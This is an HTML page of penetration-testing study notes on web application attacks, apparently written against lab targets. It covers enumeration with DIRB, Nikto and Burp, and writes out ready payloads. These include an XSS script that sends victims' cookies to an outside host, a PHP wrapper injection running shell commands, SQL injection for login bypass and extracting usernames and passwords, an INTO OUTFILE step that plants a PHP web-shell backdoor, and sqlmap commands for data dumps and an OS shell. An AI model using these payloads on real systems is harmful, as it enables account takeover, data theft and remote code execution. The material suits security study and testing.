<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Web Application Attacks</title>
</head><body>Web application enumeration (passive enumeration):<ul><li style="list-style-type: none">Inspecting URLs with Firefox"s developer tools</li>
<li style="list-style-type: none">Inspecting page content (source code and resources) with Firefox"s debugger, including the Pretty-print button and Inspector</li>
<li style="list-style-type: none">Viewing response headers (servers' responses) with a proxy and Firefox"s Network tool. Servers' headers often reveal the Web server name and version.</li>
<li style="list-style-type: none">Inspecting sitemaps like robots.txt and sitemap.xml (for example with: curl https://www.google.com/robots.txt)</li>
<li style="list-style-type: none">Locating administration consoles on standard URLs and ports</li>
</ul>
Web application assessment tools (active enumeration):<ul><li style="list-style-type: none">DIRB (Web content scanner using wordlists to identify pages and directories): dirb http://www.megacorpone.com -r -z 10</li>
<li style="list-style-type: none">Burp Suite: update to latest version, regenerate CA cert and import it in Firefox</li>
<li style="list-style-type: none">Nikto, a Web server scanner. Nikto is very loud and can be slow. For example: nikto -host=http://www.megacorpone.com -maxtime=30s</li>
</ul>
Exploiting Admin consoles:<ul><li style="list-style-type: none">DIRB + Burp Intruder</li>
</ul>
Cross-site scripting (XSS):<ul><li style="list-style-type: none">&lt;script&gt;alert("XSS")&lt;/script&gt;</li>
<li style="list-style-type: none">&lt;iframe src=http://10.11.0.4/clientsideattack height="0" width="0"&gt;&lt;/iframe&gt;</li>
<li style="list-style-type: none">Steal cookie/sessionid: &lt;script&gt;new Image().src="http://10.11.0.4/cool.jpg?output=" + document.cookie;&lt;/script&gt;</li>
</ul>
Directory traversal vulnerabilities<br/>
File inclusion vulnerabilities (local or LFI / remote or RFI)<br/>
PHP Wrappers: 10.11.0.22/menu.php?file=data:text/plain,&lt;?php echo shell_exec("dir")&gt;<br/>
SQL injection:<ul><li style="list-style-type: none">Identifying SQL injection vulnerabilities: pass a single quote to an input form and see if we get back an error from the backend database</li>
<li style="list-style-type: none">Authentication bypass: select * from users where name = 'tom' or 1 = 1;#' and password = 'jones'</li>
<li style="list-style-type: none">If the application throws an error if multimple records are returned, we can use the following: select * from users where name = 'tom' or 1 = 1 LIMIT 1;#</li>
<li style="list-style-type: none">Enumerating the database: 10.11.0.22/debug.php?id='</li>
<li style="list-style-type: none">Column number enumeration (trial and error approach): </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">10.11.0.22/debug.php?id=1 order by 1</li>
<li style="list-style-type: none">10.11.0.22/debug.php?id=1 order by 2</li>
<li style="list-style-type: none">etc.</li>
<li style="list-style-type: none">to e automated with Burp</li>
</ul>
</li>
<li style="list-style-type: none">Extracting data from the database with union statements:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">10.11.0.22/debug.php?id=1 union all select 1, 2, 3</li>
<li style="list-style-type: none">display MariaDB version: 10.11.0.22/debug.php?id=1 union all select 1, 2, @@version</li>
<li style="list-style-type: none">display the MariaDB database user: 10.11.0.22/debug.php?id=1 union all select 1, 2, user()</li>
<li style="list-style-type: none">display the layout of the database: 10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables</li>
<li style="list-style-type: none">display the column names of the users table: 10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'</li>
<li style="list-style-type: none">display the username and password columns from the users table: 10.11.0.22/debug.php?id=1 union all select 1, username, password from users</li>
</ul>
</li>
<li style="list-style-type: none">From SQL injection to code execution:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Read a file with the "load_file" function: 10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System/drivers/etc/hosts')</li>
<li style="list-style-type: none">Use the "into OUTFILE" to create a malicious php file in the Web root: 10.11.0.22/debug.php?id=1 union all select 1, 2, "&lt;?php echo '&lt;pre&gt; . shell_exec($_GET['cmd']) . '&lt;/pre&gt;', ?&gt;" into OUTFILE 'c:/xampp/htdocs/backdoor.php'</li>
<li style="list-style-type: none">Then pass a command to the newly created backdoor.php file: 10.11.0.22/backdoor.php?cmd=ipconfig</li>
</ul>
</li>
<li style="list-style-type: none">Automatic SQL injection:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Test if there is SQL injection to exploit with sqlmap: sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"</li>
<li style="list-style-type: none">Automate the extraction of data with sqlmap: sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump</li>
<li style="list-style-type: none">Upload and execute a remote shell with sqlmap: sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell</li>
<li style="list-style-type: none"></li>
</ul>
</li>
</ul>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>